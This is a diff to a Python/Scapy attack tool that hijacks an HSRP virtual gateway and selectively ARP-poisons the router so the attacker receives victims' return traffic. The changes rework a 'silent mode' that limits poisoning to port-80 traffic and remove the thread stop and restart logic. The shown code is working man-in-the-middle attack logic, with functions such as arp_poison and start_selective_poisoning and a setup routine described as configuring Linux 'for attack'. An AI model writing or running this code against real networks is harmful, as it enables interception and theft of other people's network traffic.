@@ -53,7 +53,6 @@ version: int
 pkcopy: Packet
 timekeeper = {}
 commandlist = []
-poison_stop_var = False
 # for suppressing output
 suppress = False
 ####################
@@ -284,19 +283,8 @@ def start_selective_poisoning(packet):
         print("[DEBUG] Poisoning router to get return packets")
         print(f"[DEBUG] Silent mode: {silentmode}")
     routerIP = packet[IP].src
-    # selectively poison when detecting exploitable packet
-    if silentmode:
-        silentrule = " and dst port 80"
-    else:
-        silentrule = ""
-    filterstring = f"(tcp or udp) and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac} and src net {mynetwork}{silentrule}"
-    sniff(prn=arp_poison, filter=filterstring, stop_filter=stop_poison)
-    global poison_stop_var
-    # to help signal to input handler function that thread is stopping
-    poison_stop_var = False
-    
-def stop_poison():
-    return poison_stop_var == True
+    filterstring = f"(tcp or udp) and src host not ({routerIP} or 0.0.0.0) and ether src host not {mymac} and src net {mynetwork}"
+    sniff(prn=arp_poison, filter=filterstring)
 
 def arp_poison(packet):
     '''Called by sniff() in start_selective_poisoning to poison arp cache of HSRP router when attacker receives traffic from victim
@@ -304,6 +292,12 @@ def arp_poison(packet):
     Packets will be broadcast to look like a request for the virtual gateway ip'''
     if not poisonrouter:
         return
+    elif silentmode:
+        try:
+            if packet[TCP].dport != 80:
+                return
+        except:
+            return
     if version == 1:
         virtualIP = pkcopy[HSRP].virtualIP
     else:
@@ -490,17 +484,10 @@ def user_input_handler():
                 poisonrouter = poisonrouter != True
                 print(f"[INFO] poisonrouter set to {poisonrouter}")
             case "silent":
-                global poison_stop_var
                 global silentmode
-                # signal for thread to stop
-                poison_stop_var = True
-                # wati for thread to terminate
-                while poison_stop_var:
-                    pass
                 # toggle silentmode
                 silentmode = silentmode != True
-                # start thread again
-                threading.Thread(target=start_selective_poisoning, args=(pkcopy), daemon=True).start()
+                print(f"[INFO] Silent mode: {silentmode}")
 
 def setup():
     '''Runs commands to configure linux for attack'''
